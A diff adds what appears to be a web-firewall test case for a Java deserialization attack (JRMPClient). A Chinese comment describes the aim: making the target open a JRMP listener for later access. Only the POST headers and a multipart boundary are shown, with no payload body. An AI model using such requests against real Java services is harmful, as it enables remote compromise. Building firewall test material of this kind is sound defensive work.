@@ -1,0 +1,10 @@
+# 反序列化-JAVA JRMPClient
+# 当目标存在反序列化入口时，用于尝试构造反序列化链让目标在指定端口开启 JRMP 服务，这样我们就可以连接目标开启的 JRMP 服务进行一些后续操作。
+POST /?acid=80001758&bid=hd_tag_m8mv25ok HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ok
+RM-PRO-Token: 675a736ce3421e75b35c759f746f8d52
+RM-PRO-Time: 1742808493415
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=unBKTmk38QO-pwFB1T5GQQM0tI3iEp1N
+
